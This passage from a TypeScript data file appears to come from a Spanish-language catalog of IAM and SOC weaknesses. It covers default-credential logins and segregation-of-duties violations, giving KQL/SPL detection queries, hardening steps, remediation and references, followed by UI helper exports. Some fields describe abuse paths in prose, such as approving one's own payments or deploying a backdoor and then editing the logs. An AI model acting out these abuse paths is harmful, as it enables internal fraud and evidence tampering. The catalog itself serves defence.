      kql: 'SecurityEvent | where EventID == 4624 and TargetUserName in ("admin", "root", "guest") and IpAddress !in (mgmt_ranges) | project TimeGenerated, Computer, TargetUserName, IpAddress',
      spl: 'index=win OR index=network (user=admin OR user=root) outcome=success | stats count by host, src',
      win_event_ids: [4624],
    },
    mitigacion_hardening: ['Inventario de TODOS los dispositivos (descubrimiento pasivo: se ve en el switching) + cambio de credenciales en el onboarding', 'Segmentación: IoT/equipos en VLAN aislada sin acceso a la red corporativa', 'Monitoreo de logins con nombres de usuario por defecto'],
    parcheo_remediacion: ['Cambiar las credenciales YA', 'Aislar el equipo comprometido', 'Sweep: probar credenciales por defecto en todo el rango propio (fuzzing interno)'],
    referencias: ['https://attack.mitre.org/techniques/T1078/001/', 'https://www.cisa.gov/sites/default/files/publications/CISA_Guidance_Industrial_Control_Systems_Security.pdf'],
  },
  {
    id: 'IAM-012',
    nombre: 'Violaciones de segregación de funciones (SoD)',
    categoria: 'IAM',
    severidad: 'Medium',
    mitre_attack: ['T1078'],
    descripcion_tecnica: 'La misma persona puede crear proveedores Y aprobar pagos; el admin de la nube puede modificar los logs Y su propia auditoría; el desarrollador puede hacer deploy a producción Y aprobar su propio PR. Combinaciones de permisos que enabling fraude interno y manipulación de evidencias.',
    impacto_iam_soc: 'Fraude interno enmascarado (casos: Siemens, bloggers de compras) y, en incidente externo, capacidad del atacante (con una sola cuenta) para ejecutar Y limpiar. Las matrices SoD existen en ERPs pero casi nunca en cloud/IAM moderno.',
    vector_ataque: ['Uso de la doble función: crear el pago + aprobarlo (fraude)', 'Atacante con una cuenta: deploy backdoor + editar los logs que lo delatarían'],
    deteccion: {
      kql: '// gobierno: matriz SoD de pares conflictivos (crear|aprobar, deploy|auditar) aplicada a los permisos efectivos; el SOC alerta si UNA cuenta ejecuta ambos lados del par en ventanas cortas',
    },
    mitigacion_hardening: ['Definir pares SoD críticos por proceso (pagos, accesos, deploys, logs) y aplicarlos como políticas de IAM deny', 'Cuatro ojos en operaciones críticas (aprobador ≠ ejecutor, en tecnología igual que en finanzas)', 'Revisiones SoD automatizadas en cada cambio de rol'],
    parcheo_remediacion: ['Separar las funciones acumuladas (mover un permiso a otra cuenta/rol)', 'Auditar el uso histórico de los pares conflictivos (¿hubo fraude?)', 'Monitor de alerta cuando la misma cuenta ejecuta ambos lados del par'],
    referencias: ['https://www.isaca.org/resources/isaca-journal/issues/2020/volume-1/segregation-of-duties-within-the-iam-context', 'https://csrc.nist.gov/glossary/term/separation_of_duty'],
  },
];

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

/** Todas las categorías con sus etiquetas de UI (en orden de despliegue). */
export const VULN_CATEGORY_LABELS: Record<VulnerabilityCategory, string> = {
  IAM: 'IAM',
  AD: 'Active Directory',
  Auth: 'Auth / JWT / OAuth / SAML',
  Cloud_IAM: 'Cloud IAM',
  SOC_Evasion: 'Evasión SOC',
  PrivEsc: 'Privilege Escalation',
  LateralMovement: 'Movimiento Lateral',
  Persistence: 'Persistencia',
};

/** Orden de severidad para chips y ordenación. */
export const VULN_SEVERITY_ORDER: Record<VulnerabilitySeverity, number> = {
  Critical: 0,
  High: 1,
  Medium: 2,
  Low: 3,
};

/** Busca una vulnerabilidad por su id (p. ej. "AD-016") — usado por deep-links. */
export function findVulnerabilityById(id: string): VulnerabilityInfo | undefined {
  return VULNERABILITIES.find((v) => v.id === id);
}

/** Lista de severidades (para filtros). */
export const VULN_SEVERITIES: VulnerabilitySeverity[] = ['Critical', 'High', 'Medium', 'Low'];

/** Lista de categorías (para filtros). */
export const VULN_CATEGORIES: VulnerabilityCategory[] = [
  'AD', 'Auth', 'Cloud_IAM', 'IAM', 'LateralMovement', 'Persistence', 'PrivEsc', 'SOC_Evasion',
];
